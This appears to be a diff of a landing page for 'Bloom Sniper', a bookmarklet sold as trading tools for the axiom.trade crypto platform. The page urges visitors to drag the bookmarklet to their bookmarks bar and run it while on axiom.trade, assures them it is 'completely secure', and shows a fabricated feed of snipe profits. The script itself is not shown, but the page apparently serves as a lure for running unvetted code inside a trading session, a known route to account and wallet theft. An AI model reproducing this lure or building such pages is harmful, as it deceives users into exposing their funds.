var(--tw-space-y-reverse))}.font-bold{font-weight:700}.text-blue-400{--tw-text-opacity:1;color:rgb(96 165 250 / var(--tw-text-opacity, 1))}.text-cyan-400{--tw-text-opacity:1;color:rgb(34 211 238 / var(--tw-text-opacity, 1))}.text-green-400{--tw-text-opacity:1;color:rgb(74 222 128 / var(--tw-text-opacity, 1))}.text-orange-400{--tw-text-opacity:1;color:rgb(251 146 60 / var(--tw-text-opacity, 1))}.text-purple-400{--tw-text-opacity:1;color:rgb(192 132 252 / var(--tw-text-opacity, 1))}.text-red-400{--tw-text-opacity:1;color:rgb(248 113 113 / var(--tw-text-opacity, 1))}.text-yellow-400{--tw-text-opacity:1;color:rgb(250 204 21 / var(--tw-text-opacity, 1))}</style><style>@keyframes slide-in-one-tap {
+  from {
+    transform: translateY(80px);
+  }
+  to {
+    transform: translateY(0px);
+  }
+}
+
+.trust-hide-gracefully {
+  opacity: 0;
+}
+
+.trust-wallet-one-tap .hidden {
+    display: none;
+  }
+
+.trust-wallet-one-tap .semibold {
+    font-weight: 500;
+  }
+
+.trust-wallet-one-tap .binance-plex {
+    font-family: 'Binance';
+  }
+
+.trust-wallet-one-tap .rounded-full {
+    border-radius: 50%;
+  }
+
+.trust-wallet-one-tap .flex {
+    display: flex;
+  }
+
+.trust-wallet-one-tap .flex-col {
+    flex-direction: column;
+  }
+
+.trust-wallet-one-tap .items-center {
+    align-items: center;
+  }
+
+.trust-wallet-one-tap .space-between {
+    justify-content: space-between;
+  }
+
+.trust-wallet-one-tap .justify-center {
+    justify-content: center;
+  }
+
+.trust-wallet-one-tap .w-full {
+    width: 100%;
+  }
+
+.trust-wallet-one-tap .box {
+    transition: all 0.5s cubic-bezier(0, 0, 0, 1.43);
+    animation: slide-in-one-tap 0.5s cubic-bezier(0, 0, 0, 1.43);
+    width: 384px;
+    border-radius: 15px;
+    background: #fff;
+    box-shadow: 0px 2px 4px 0px rgba(0, 0, 0, 0.25);
+    position: fixed;
+    right: 30px;
+    bottom: 30px;
+    z-index: 1020;
+  }
+
+.trust-wallet-one-tap .header {
+    gap: 15px;
+    border-bottom: 1px solid #e6e6e6;
+    padding: 10px 18px;
+  }
+
+.trust-wallet-one-tap .header .left-items {
+      gap: 15px;
     }
 
-    body {
-      margin: 0;
-      font-family: 'Inter', system-ui, sans-serif;
-      background: var(--bg-gradient);
-      color: #eaf1ff;
-      overflow-x: hidden;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-    }
-
-    .container {
-      max-width: 780px;
-      text-align: center;
-      padding: 40px;
-      background: rgba(15, 20, 40, 0.7);
-      border-radius: 20px;
-      box-shadow: 0 0 40px rgba(60, 100, 255, 0.2);
-      backdrop-filter: blur(12px);
-    }
-
-    h1 {
-      font-size: 2.2rem;
-      background: linear-gradient(90deg, var(--accent1), var(--accent2), var(--accent3));
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      margin-bottom: 20px;
-    }
-
-    p.description {
-      color: var(--muted);
-      font-size: 1rem;
-      line-height: 1.6;
-      margin-bottom: 28px;
-    }
-
-    .bookmarklet {
-      display: inline-block;
-      padding: 14px 22px;
-      border-radius: 12px;
-      background: linear-gradient(90deg, var(--accent1), var(--accent2));
-      color: white;
+.trust-wallet-one-tap .header .title {
+      color: #1e2329;
+      font-size: 18px;
       font-weight: 600;
-      text-decoration: none;
-      box-shadow: 0 0 18px rgba(100, 150, 255, 0.5);
-      cursor: grab;
-      transition: transform 0.2s, box-shadow 0.3s;
+      line-height: 28px;
     }
 
-    .bookmarklet:hover {
-      transform: scale(1.05);
-      box-shadow: 0 0 25px rgba(100, 150, 255, 0.8);
+.trust-wallet-one-tap .header .subtitle {
+      color: #474d57;
+      font-size: 14px;
+      line-height: 20px;
     }
 
-    .btn {
-      padding: 14px 22px;
-      margin-left: 10px;
-      border-radius: 12px;
-      background: linear-gradient(90deg, var(--accent2), var(--accent3));
-      border: none;
-      color: #071021;
-      font-weight: 600;
+.trust-wallet-one-tap .header .close {
+      color: #1e2329;
       cursor: pointer;
-      box-shadow: 0 0 20px rgba(70, 255, 200, 0.4);
-      transition: transform 0.2s, box-shadow 0.3s;
     }
 
-    .btn:hover {
-      transform: scale(1.05);
-      box-shadow: 0 0 30px rgba(70, 255, 200, 0.6);
+.trust-wallet-one-tap .body {
+    padding: 9px 18px;
+    gap: 10px;
+  }
+
+.trust-wallet-one-tap .body .right-items {
+      gap: 10px;
+      width: 100%;
     }
 
-    footer {
-      margin-top: 32px;
-      color: var(--muted);
-      font-size: 0.9rem;
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <h1>Advanced Axiom Trade Tools, Bloom Sniper</h1>
-    <p class="description">
-      Advanced trading tools that give you an edge on <strong>axiom.trade</strong>. Monitor influencers, track wallets, automate buys, and never miss opportunities again.
-    </p>
-    <p class="description">
-      Drag the bookmarklet to your bookmarks bar (press <strong>[CTR+SHIFT+B]</strong> if not open), then click the bookmarklet while on Axiom to activate <strong>Bloom Sniper</strong>.
-    </p>
+.trust-wallet-one-tap .body .right-items .wallet-title {
+        color: #1e2329;
+        font-size: 16px;
+        font-weight: 600;
+        line-height: 20px;
+      }
 
-    <div>
-      <a class="bookmarklet" id="drag-link" draggable="true" title="Drag to bookmarks bar">Drag Me</a>
-      <button class="btn" id="copy-btn">Copy</button>
+.trust-wallet-one-tap .body .right-items .wallet-subtitle {
+        color: #474d57;
+        font-size: 14px;
+        line-height: 20px;
+      }
+
+.trust-wallet-one-tap .connect-indicator {
+    gap: 15px;
+    padding: 8px 0;
+  }
+
+.trust-wallet-one-tap .connect-indicator .flow-icon {
+      color: #474d57;
+    }
+
+.trust-wallet-one-tap .loading-color {
+    color: #fff;
+  }
+
+.trust-wallet-one-tap .button {
+    border-radius: 50px;
+    outline: 2px solid transparent;
+    outline-offset: 2px;
+    background-color: rgb(5, 0, 255);
+    border-color: rgb(229, 231, 235);
+    cursor: pointer;
+    text-align: center;
+    height: 45px;
+  }
+
+.trust-wallet-one-tap .button .button-text {
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      line-height: 20px;
+    }
+
+.trust-wallet-one-tap .footer {
+    margin: 20px 30px;
+  }
+
+.trust-wallet-one-tap .check-icon {
+    color: #fff;
+  }
+
+@font-face {
+  font-family: 'Binance';
+  src: url("") format('opentype');
+  font-weight: 400;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: 'Binance';
+  src: url("") format('opentype');
+  font-weight: 500;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: 'Binance';
+  src: url("") format('opentype');
+  font-weight: 600;
+  font-style: normal;
+}
+
+/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIndlYnBhY2s6Ly8uL2FwcC9zcmMvb25lVGFwL3N0eWxlLmNzcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTtFQUNFO0lBQ0UsMkJBQTJCO0VBQzdCO0VBQ0E7SUFDRSwwQkFBMEI7RUFDNUI7QUFDRjs7QUFFQTtFQUNFLFVBQVU7QUFDWjs7QUFHRTtJQUNFLGFBQWE7RUFDZjs7QUFFQTtJQUNFLGdCQUFnQjtFQUNsQjs7QUFFQTtJQUNFLHNCQUFzQjtFQUN4Qjs7QUFFQTtJQUNFLGtCQUFrQjtFQUNwQjs7QUFFQTtJQUNFLGFBQWE7RUFDZjs7QUFFQTtJQUNFLHNCQUFzQjtFQUN4Qjs7QUFFQTtJQUNFLG1CQUFtQjtFQUNyQjs7QUFFQTtJQUNFLDhCQUE4QjtFQUNoQzs7QUFFQTtJQUNFLHVCQUF1QjtFQUN6Qjs7QUFFQTtJQUNFLFdBQVc7RUFDYjs7QUFFQTtJQUNFLGdEQUFnRDtJQUNoRCw0REFBNEQ7SUFDNUQsWUFBWTtJQUNaLG1CQUFtQjtJQUNuQixnQkFBZ0I7SUFDaEIsK0NBQStDO0lBQy9DLGVBQWU7SUFDZixXQUFXO0lBQ1gsWUFBWTtJQUNaLGFBQWE7RUFDZjs7QUFFQTtJQUNFLFNBQVM7SUFDVCxnQ0FBZ0M7SUFDaEMsa0JBQWtCO0VBdUJwQjs7QUFyQkU7TUFDRSxTQUFTO0lBQ1g7O0FBRUE7TUFDRSxjQUFjO01BQ2QsZUFBZTtNQUNmLGdCQUFnQjtNQUNoQixpQkFBaUI7SUFDbkI7O0FBRUE7TUFDRSxjQUFjO01BQ2QsZUFBZTtNQUNmLGlCQUFpQjtJQUNuQjs7QUFFQTtNQUNFLGNBQWM7TUFDZCxlQUFlO0lBQ2pCOztBQUdGO0lBQ0UsaUJBQWlCO0lBQ2pCLFNBQVM7RUFtQlg7O0FBakJFO01BQ0UsU0FBUztNQUNULFdBQVc7SUFjYjs7QUFaRTtRQUNFLGNBQWM7UUFDZCxlQUFlO1FBQ2YsZ0JBQWdCO1FBQ2hCLGlCQUFpQjtNQUNuQjs7QUFFQTtRQUNFLGNBQWM7UUFDZCxlQUFlO1FBQ2YsaUJBQWlCO01BQ25COztBQUlKO0lBQ0UsU0FBUztJQUNULGNBQWM7RUFLaEI7O0FBSEU7TUFDRSxjQUFjO0lBQ2hCOztBQUdGO0lBQ0UsV0FBVztFQUNiOztBQUVBO0lBQ0UsbUJBQW1CO0lBQ25CLDhCQUE4QjtJQUM5QixtQkFBbUI7SUFDbkIsZ0NBQWdDO0lBQ2hDLGdDQUFnQztJQUNoQyxlQUFlO0lBQ2Ysa0JBQWtCO0lBQ2xCLFlBQVk7RUFRZDs7QUFORTtNQUNFLFdBQVc7TUFDWCxlQUFlO01BQ2YsZ0JBQWdCO01BQ2hCLGlCQUFpQjtJQUNuQjs7QUFHRjtJQUNFLGlCQUFpQjtFQUNuQjs7QUFFQTtJQUNFLFdBQVc7RUFDYjs7QUFHRjtFQUNFLHNCQUFzQjtFQUN0QiwrREFBMEU7RUFDMUUsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQjs7QUFFQTtFQUNFLHNCQUFzQjtFQUN0QiwrREFBeUU7RUFDekUsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQjs7QUFFQTtFQUNFLHNCQUFzQjtFQUN0QiwrREFBMkU7RUFDM0UsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQiIsInNvdXJjZXNDb250ZW50IjpbIkBrZXlmcmFtZXMgc2xpZGUtaW4tb25lLXRhcCB7XG4gIGZyb20ge1xuICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSg4MHB4KTtcbiAgfVxuICB0byB7XG4gICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKDBweCk7XG4gIH1cbn1cblxuLnRydXN0LWhpZGUtZ3JhY2VmdWxseSB7XG4gIG9wYWNpdHk6IDA7XG59XG5cbi50cnVzdC13YWxsZXQtb25lLXRhcCB7XG4gIC5oaWRkZW4ge1xuICAgIGRpc3BsYXk6IG5vbmU7XG4gIH1cblxuICAuc2VtaWJvbGQge1xuICAgIGZvbnQtd2VpZ2h0OiA1MDA7XG4gIH1cblxuICAuYmluYW5jZS1wbGV4IHtcbiAgICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICB9XG5cbiAgLnJvdW5kZWQtZnVsbCB7XG4gICAgYm9yZGVyLXJhZGl1czogNTAlO1xuICB9XG5cbiAgLmZsZXgge1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gIH1cblxuICAuZmxleC1jb2wge1xuICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47XG4gIH1cblxuICAuaXRlbXMtY2VudGVyIHtcbiAgICBhbGlnbi1pdGVtczogY2VudGVyO1xuICB9XG5cbiAgLnNwYWNlLWJldHdlZW4ge1xuICAgIGp1c3RpZnktY29udGVudDogc3BhY2UtYmV0d2VlbjtcbiAgfVxuXG4gIC5qdXN0aWZ5LWNlbnRlciB7XG4gICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7XG4gIH1cblxuICAudy1mdWxsIHtcbiAgICB3aWR0aDogMTAwJTtcbiAgfVxuXG4gIC5ib3gge1xuICAgIHRyYW5zaXRpb246IGFsbCAwLjVzIGN1YmljLWJlemllcigwLCAwLCAwLCAxLjQzKTtcbiAgICBhbmltYXRpb246IHNsaWRlLWluLW9uZS10YXAgMC41cyBjdWJpYy1iZXppZXIoMCwgMCwgMCwgMS40Myk7XG4gICAgd2lkdGg6IDM4NHB4O1xuICAgIGJvcmRlci1yYWRpdXM6IDE1cHg7XG4gICAgYmFja2dyb3VuZDogI2ZmZjtcbiAgICBib3gtc2hhZG93OiAwcHggMnB4IDRweCAwcHggcmdiYSgwLCAwLCAwLCAwLjI1KTtcbiAgICBwb3NpdGlvbjogZml4ZWQ7XG4gICAgcmlnaHQ6IDMwcHg7XG4gICAgYm90dG9tOiAzMHB4O1xuICAgIHotaW5kZXg6IDEwMjA7XG4gIH1cblxuICAuaGVhZGVyIHtcbiAgICBnYXA6IDE1cHg7XG4gICAgYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkICNlNmU2ZTY7XG4gICAgcGFkZGluZzogMTBweCAxOHB4O1xuXG4gICAgLmxlZnQtaXRlbXMge1xuICAgICAgZ2FwOiAxNXB4O1xuICAgIH1cblxuICAgIC50aXRsZSB7XG4gICAgICBjb2xvcjogIzFlMjMyOTtcbiAgICAgIGZvbnQtc2l6ZTogMThweDtcbiAgICAgIGZvbnQtd2VpZ2h0OiA2MDA7XG4gICAgICBsaW5lLWhlaWdodDogMjhweDtcbiAgICB9XG5cbiAgICAuc3VidGl0bGUge1xuICAgICAgY29sb3I6ICM0NzRkNTc7XG4gICAgICBmb250LXNpemU6IDE0cHg7XG4gICAgICBsaW5lLWhlaWdodDogMjBweDtcbiAgICB9XG5cbiAgICAuY2xvc2Uge1xuICAgICAgY29sb3I6ICMxZTIzMjk7XG4gICAgICBjdXJzb3I6IHBvaW50ZXI7XG4gICAgfVxuICB9XG5cbiAgLmJvZHkge1xuICAgIHBhZGRpbmc6IDlweCAxOHB4O1xuICAgIGdhcDogMTBweDtcblxuICAgIC5yaWdodC1pdGVtcyB7XG4gICAgICBnYXA6IDEwcHg7XG4gICAgICB3aWR0aDogMTAwJTtcblxuICAgICAgLndhbGxldC10aXRsZSB7XG4gICAgICAgIGNvbG9yOiAjMWUyMzI5O1xuICAgICAgICBmb250LXNpemU6IDE2cHg7XG4gICAgICAgIGZvbnQtd2VpZ2h0OiA2MDA7XG4gICAgICAgIGxpbmUtaGVpZ2h0OiAyMHB4O1xuICAgICAgfVxuXG4gICAgICAud2FsbGV0LXN1YnRpdGxlIHtcbiAgICAgICAgY29sb3I6ICM0NzRkNTc7XG4gICAgICAgIGZvbnQtc2l6ZTogMTRweDtcbiAgICAgICAgbGluZS1oZWlnaHQ6IDIwcHg7XG4gICAgICB9XG4gICAgfVxuICB9XG5cbiAgLmNvbm5lY3QtaW5kaWNhdG9yIHtcbiAgICBnYXA6IDE1cHg7XG4gICAgcGFkZGluZzogOHB4IDA7XG5cbiAgICAuZmxvdy1pY29uIHtcbiAgICAgIGNvbG9yOiAjNDc0ZDU3O1xuICAgIH1cbiAgfVxuXG4gIC5sb2FkaW5nLWNvbG9yIHtcbiAgICBjb2xvcjogI2ZmZjtcbiAgfVxuXG4gIC5idXR0b24ge1xuICAgIGJvcmRlci1yYWRpdXM6IDUwcHg7XG4gICAgb3V0bGluZTogMnB4IHNvbGlkIHRyYW5zcGFyZW50O1xuICAgIG91dGxpbmUtb2Zmc2V0OiAycHg7XG4gICAgYmFja2dyb3VuZC1jb2xvcjogcmdiKDUsIDAsIDI1NSk7XG4gICAgYm9yZGVyLWNvbG9yOiByZ2IoMjI5LCAyMzEsIDIzNSk7XG4gICAgY3Vyc29yOiBwb2ludGVyO1xuICAgIHRleHQtYWxpZ246IGNlbnRlcjtcbiAgICBoZWlnaHQ6IDQ1cHg7XG5cbiAgICAuYnV0dG9uLXRleHQge1xuICAgICAgY29sb3I6ICNmZmY7XG4gICAgICBmb250LXNpemU6IDE2cHg7XG4gICAgICBmb250LXdlaWdodDogNjAwO1xuICAgICAgbGluZS1oZWlnaHQ6IDIwcHg7XG4gICAgfVxuICB9XG5cbiAgLmZvb3RlciB7XG4gICAgbWFyZ2luOiAyMHB4IDMwcHg7XG4gIH1cblxuICAuY2hlY2staWNvbiB7XG4gICAgY29sb3I6ICNmZmY7XG4gIH1cbn1cblxuQGZvbnQtZmFjZSB7XG4gIGZvbnQtZmFtaWx5OiAnQmluYW5jZSc7XG4gIHNyYzogdXJsKCcuL2ZvbnRzL2JpbmFuY2VQbGV4L0JpbmFuY2VQbGV4LVJlZ3VsYXIub3RmJykgZm9ybWF0KCdvcGVudHlwZScpO1xuICBmb250LXdlaWdodDogNDAwO1xuICBmb250LXN0eWxlOiBub3JtYWw7XG59XG5cbkBmb250LWZhY2Uge1xuICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICBzcmM6IHVybCgnLi9mb250cy9iaW5hbmNlUGxleC9CaW5hbmNlUGxleC1NZWRpdW0ub3RmJykgZm9ybWF0KCdvcGVudHlwZScpO1xuICBmb250LXdlaWdodDogNTAwO1xuICBmb250LXN0eWxlOiBub3JtYWw7XG59XG5cbkBmb250LWZhY2Uge1xuICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICBzcmM6IHVybCgnLi9mb250cy9iaW5hbmNlUGxleC9CaW5hbmNlUGxleC1TZW1pQm9sZC5vdGYnKSBmb3JtYXQoJ29wZW50eXBlJyk7XG4gIGZvbnQtd2VpZ2h0OiA2MDA7XG4gIGZvbnQtc3R5bGU6IG5vcm1hbDtcbn1cbiJdLCJzb3VyY2VSb290IjoiIn0= */</style>
+
+
+
+    <header class="header">
+        <div class="container" bis_skin_checked="1">
+            <div class="header-content" bis_skin_checked="1">
+                <div class="logo" bis_skin_checked="1">
+                    Bloom <span class="accent">Sniper</span>
+                </div>
+                <div class="nav-buttons" bis_skin_checked="1">
+                    <button class="btn btn-secondary" onclick="scrollToSection('how-it-works')">Instructions</button>
+                    <a class="btn btn-primary bookmarklet" draggable="true">Activate</a>
+                </div>
+            </div>
+        </div>
+    </header>
+
+
+    <main>
+
+        <section class="hero">
+            <div class="container" bis_skin_checked="1">
+                <div class="hero-badge" bis_skin_checked="1">✨ Your Unfair Advantage in Crypto</div>
+                
+                <h1 class="hero-title">
+                    The fastest way to <br>
+                    <span class="accent">dominate</span> axiom.trade
+                </h1>
+                
+                <p class="hero-subtitle">
+                    Advanced trading tools that give you an edge on axiom.trade. Monitor influencers, track wallets, 
+                    automate buys, and never miss opportunities again.<br><br>
+                    Drag the bookmarklet to your bookmarks bar (press <code>[<script>document.write(navigator.platform.includes("Mac") ? "CMD" : "CTRL")</script>CMD+SHIFT+B]</code> if not open) then click the bookmarklet while on <a href="https://axiom.trade/">Axiom</a> to activate Bloom Sniper.
+                </p>
+                
+                <div class="activator-section" bis_skin_checked="1">
+
+                    <a id="activatorBtn" class="bookmarklet activator-btn" draggable="true">Activate</a>
+
+
+                    
+                </div>
+                
+                <p class="hero-note">no installation • works in browser • completely secure</p>
+            </div>
+        </section>
+
+
+        <section class="section" id="features">
+            <div class="container" bis_skin_checked="1">
+                <div class="section-header animate-fade-in animate-in" bis_skin_checked="1">
+                    <h2 class="section-title">Everything you need to win</h2>
+                    <p class="section-subtitle">Professional trading tools made simple</p>
+                </div>
+                
+                <div class="features-grid" bis_skin_checked="1">
+
+                    <div class="feature-card animate-on-scroll animate-in" bis_skin_checked="1">
+                        <div class="feature-icon" bis_skin_checked="1">🎯</div>
+                        <h3 class="feature-title">Influencer Sniper</h3>
+                        <p class="feature-description">
+                            Monitor Twitter accounts. When they mention a coin, get instant alerts 
+                            and one-click sniping for axiom.trade launches.
+                        </p>
+                    </div>
+                    
+
+                    <div class="feature-card animate-on-scroll animate-in" bis_skin_checked="1">
+                        <div class="feature-icon" bis_skin_checked="1">⚡</div>
+                        <h3 class="feature-title">Pre-Migration Snipe</h3>
+                        <p class="feature-description">
+                            Automatically detect when coins are about to migrate to Raydium. 
+                            Execute orders with MEV protection before launch.
+                        </p>
+                    </div>
+                    
+
+                    <div class="feature-card animate-on-scroll animate-in" bis_skin_checked="1">
+                        <div class="feature-icon" bis_skin_checked="1">👁️</div>
+                        <h3 class="feature-title">Wallet Stalker</h3>
+                        <p class="feature-description">
+                            Track successful traders' wallets. Get notifications and copy their 
+                            axiom.trade buys automatically.
+                        </p>
+                    </div>
+                    
+
+                    <div class="feature-card animate-on-scroll animate-in" bis_skin_checked="1">
+                        <div class="feature-icon" bis_skin_checked="1">🔧</div>
+                        <h3 class="feature-title">Auto Strategies</h3>
+                        <p class="feature-description">
+                            Set take-profit, stop-loss, and time-based selling rules. 
+                            Customize buy amounts, slippage, and gas fees.
+                        </p>
+                    </div>
+                    
+
+                    <div class="feature-card animate-on-scroll animate-in" bis_skin_checked="1">
+                        <div class="feature-icon" bis_skin_checked="1">📈</div>
+                        <h3 class="feature-title">Live Alpha Feed</h3>
+                        <p class="feature-description">
+                            Real-time feed of trending coins, whale alerts, and new pair 
+                            detections across axiom.trade.
+                        </p>
+                    </div>
+                    
+
+                    <div class="feature-card animate-on-scroll animate-in" bis_skin_checked="1">
+                        <div class="feature-icon" bis_skin_checked="1">🛡️</div>
+                        <h3 class="feature-title">MEV Protection</h3>
+                        <p class="feature-description">
+                            Advanced protection against front-running and sandwich attacks. 
+                            Your trades stay private and profitable.
+                        </p>
+                    </div>
+                    
+
+                    <div class="feature-card animate-on-scroll animate-in" bis_skin_checked="1">
+                        <div class="feature-icon" bis_skin_checked="1">🔔</div>
+                        <h3 class="feature-title">Smart Alerts</h3>
+                        <p class="feature-description">
+                            Custom notifications for price movements, volume spikes, and market cap milestones. 
+                            Never miss important opportunities.
+                        </p>
+                    </div>
+                    
+
+                    <div class="feature-card animate-on-scroll animate-in" bis_skin_checked="1">
+                        <div class="feature-icon" bis_skin_checked="1">📊</div>
+                        <h3 class="feature-title">Portfolio Tracker</h3>
+                        <p class="feature-description">
+                            Track all your axiom.trade positions in one place. View PnL, 
+                            performance metrics, and trading history.
+                        </p>
+                    </div>
+                    
+
+                    <div class="feature-card animate-on-scroll animate-in" bis_skin_checked="1">
+                        <div class="feature-icon" bis_skin_checked="1">🎭</div>
+                        <h3 class="feature-title">Stealth Mode</h3>
+                        <p class="feature-description">
+                            Hide your trading activity from other users. Trade anonymously 
+                            without revealing your positions or strategies.
+                        </p>
+                    </div>
+                    
+
+                    <div class="feature-card animate-on-scroll animate-in" bis_skin_checked="1">
+                        <div class="feature-icon" bis_skin_checked="1">🚀</div>
+                        <h3 class="feature-title">Instant Execution</h3>
+                        <p class="feature-description">
+                            Lightning-fast order execution with sub-second response times. 
+                            Never miss opportunities due to slow execution.
+                        </p>
+                    </div>
+                    
+
+                    <div class="feature-card animate-on-scroll animate-in" bis_skin_checked="1">
+                        <div class="feature-icon" bis_skin_checked="1">📱</div>
+                        <h3 class="feature-title">Mobile Notifications</h3>
+                        <p class="feature-description">
+                            Get instant push notifications on your phone for important 
+                            trading opportunities and price alerts.
+                        </p>
+                    </div>
+                    
+
+                    <div class="feature-card" bis_skin_checked="1">
+                        <div class="feature-icon" bis_skin_checked="1">🔍</div>
+                        <h3 class="feature-title">Smart Analytics</h3>
+                        <p class="feature-description">
+                            Advanced market analysis with AI-powered insights. 
+                            Identify patterns and trends before others do.
+                        </p>
+                    </div>
+                    
+
+                    <div class="feature-card feature-card-full" bis_skin_checked="1">
+                        <div class="feature-icon" bis_skin_checked="1">📡</div>
+                        <h3 class="feature-title">Real-Time Alpha Feed</h3>
+                        <p class="feature-description" style="margin-bottom: 24px;">
+                            Watch high-value trading activities as they happen. Only the most important 
+                            whale movements, snipe alerts, and market opportunities.
+                        </p>
+                        
+                        <div class="alpha-feed" bis_skin_checked="1">
+                            <div class="animate-scroll space-y-1" bis_skin_checked="1">
+
+                                <div class="text-green-400 font-bold" bis_skin_checked="1">🎯 SNIPE ALERT: 8.5 SOL → $BONKWIFHAT (+127% in 2m)</div>
+                                <div class="text-red-400 font-bold" bis_skin_checked="1">🚨 WHALE DUMP: 47 SOL sold $PEPE (-23% impact)</div>
+                                <div class="text-blue-400 font-bold" bis_skin_checked="1">🐋 MEGA BUY: 7xK9...m31 bought 156 SOL of $GROK</div>
+                                <div class="text-yellow-400 font-bold" bis_skin_checked="1">📈 HOT TREND: $WIF 340 buys/min (+89% 1h)</div>
+                                <div class="text-purple-400 font-bold" bis_skin_checked="1">⚡ MIGRATION: $SHIB ready for Raydium (98% bonding curve)</div>
+                                <div class="text-green-400 font-bold" bis_skin_checked="1">🎯 SNIPE SUCCESS: 2.1 SOL → $DOGE (+89% profit)</div>
+                                <div class="text-orange-400 font-bold" bis_skin_checked="1">🔥 INFLUENCER SIGNAL: @elonmusk mentioned $AI - 12 new launches</div>
+                                <div class="text-cyan-400 font-bold" bis_skin_checked="1">💎 DIAMOND HANDS: 3Ahf...j62 holding 50 SOL $BONK (no sells)</div>
+                                <div class="text-green-400 font-bold" bis_skin_checked="1">🎯 AUTO SNIPE: 1.8 SOL → $PEPECOIN (+156% in 5m)</div>
+                                <div class="text-red-400 font-bold" bis_skin_checked="1">⚠️ RUG ALERT: $SCAM dev wallet drained - avoid!</div>
+                                <div class="text-blue-400 font-bold" bis_skin_checked="1">🐋 WHALE ENTRY: BWK...dT7 bought 89 SOL of $SOLANA</div>
+                                <div class="text-yellow-400 font-bold" bis_skin_checked="1">📊 VOLUME SPIKE: $PUMP 1.2M volume (+450% 30m)</div>
+                                <div class="text-purple-400 font-bold" bis_skin_checked="1">⭐ DEV ACTIVE: $MOON dev burning LP tokens</div>
+                                <div class="text-green-400 font-bold" bis_skin_checked="1">🎯 PERFECT ENTRY: 0.9 SOL → $CATS (+234% profit)</div>
+                                <div class="text-orange-400 font-bold" bis_skin_checked="1">🎭 STEALTH WHALE: Anonymous bought 67 SOL $ANON</div>
+                                <div class="text-cyan-400 font-bold" bis_skin_checked="1">💰 PROFIT TAKING: 4L2...x8s sold 25% $DOGE (+400% gains)</div>
+                                <div class="text-green-400 font-bold" bis_skin_checked="1">🎯 LIGHTNING SNIPE: 3.2 SOL → $ROCKET (+67% instant)</div>
+                                <div class="text-blue-400 font-bold" bis_skin_checked="1">🐋 INSTITUTIONAL: 5KL...m9x bought 234 SOL of $ETH</div>
+                                <div class="text-yellow-400 font-bold" bis_skin_checked="1">📈 BREAKOUT: $MEME broke resistance (+156% potential)</div>
+                                <div class="text-purple-400 font-bold" bis_skin_checked="1">⚡ EARLY DETECTION: $ALPHA 15 seconds before trend</div>
+                                <div class="text-green-400 font-bold" bis_skin_checked="1">🎯 COPY TRADE: Following 9xT...k2s (+89% success rate)</div>
+                                <div class="text-orange-400 font-bold" bis_skin_checked="1">🔥 VIRAL TWEET: $DOGE mentioned by @cathiedwood</div>
+                                <div class="text-cyan-400 font-bold" bis_skin_checked="1">💎 HODL ALERT: Top holder accumulated +45 SOL $BONK</div>
+                                <div class="text-red-400 font-bold" bis_skin_checked="1">🚨 SELL PRESSURE: Large holder moving $SHIB to exchange</div>
+                                
+
+                                <div class="text-green-400 font-bold" bis_skin_checked="1">🎯 SNIPE ALERT: 8.5 SOL → $BONKWIFHAT (+127% in 2m)</div>
+                                <div class="text-red-400 font-bold" bis_skin_checked="1">🚨 WHALE DUMP: 47 SOL sold $PEPE (-23% impact)</div>
+                                <div class="text-blue-400 font-bold" bis_skin_checked="1">🐋 MEGA BUY: 7xK9...m31 bought 156 SOL of $GROK</div>
+                                <div class="text-yellow-400 font-bold" bis_skin_checked="1">📈 HOT TREND: $WIF 340 buys/min (+89% 1h)</div>
+                                <div class="text-purple-400 font-bold" bis_skin_checked="1">⚡ MIGRATION: $SHIB ready for Raydium (98% bonding curve)</div>
+                                <div class="text-green-400 font-bold" bis_skin_checked="1">🎯 SNIPE SUCCESS: 2.1 SOL → $DOGE (+89% profit)</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+
+
+
+        <section class="section" id="how-it-works">
+            <div class="container" bis_skin_checked="1">
+                <div class="section-header animate-fade-in" bis_skin_checked="1">
+                    <h2 class="section-title">Get started in 30 seconds</h2>
+                    <p class="section-subtitle">No complex setup. No wallet connections. Just drag and trade.</p>
+                </div>
+                
+                <div class="steps-grid" bis_skin_checked="1">
+                    <div class="step animate-slide-up" bis_skin_checked="1">
+                        <div class="step-number" bis_skin_checked="1">1</div>
+                        <h3 class="step-title">Drag to Install</h3>
+                        <p class="step-description">Drag the pink button above to your browser's bookmarks bar</p>
+                    </div>
+                    
+                    <div class="step animate-slide-up" bis_skin_checked="1">
+                        <div class="step-number" bis_skin_checked="1">2</div>
+                        <h3 class="step-title">Activate on Axiom.trade</h3>
+                        <p class="step-description">Visit axiom.trade and click your bookmark to activate the tool</p>
+                    </div>
+                    
+                    <div class="step animate-slide-up" bis_skin_checked="1">
+                        <div class="step-number" bis_skin_checked="1">3</div>
+                        <h3 class="step-title">Start Trading</h3>
+                        <p class="step-description">Configure your settings or use defaults and start sniping</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+
+
+
+
+
+        <section class="section" id="pricing">
+            <div class="container" bis_skin_checked="1">
+                <div class="section-header animate-fade-in" bis_skin_checked="1">
+                    <h2 class="section-title">Choose Your Plan</h2>
+                    <p class="section-subtitle">Start free, upgrade when you're ready to dominate</p>
+                </div>
+                
+                <div class="pricing-grid" bis_skin_checked="1">
+
+                    <div class="pricing-card animate-slide-left" bis_skin_checked="1">
+                        <div class="pricing-header" bis_skin_checked="1">
+                            <h3 class="pricing-title">Free</h3>
+                            <div class="pricing-price" bis_skin_checked="1">
+                                <span class="price-amount">$0</span>
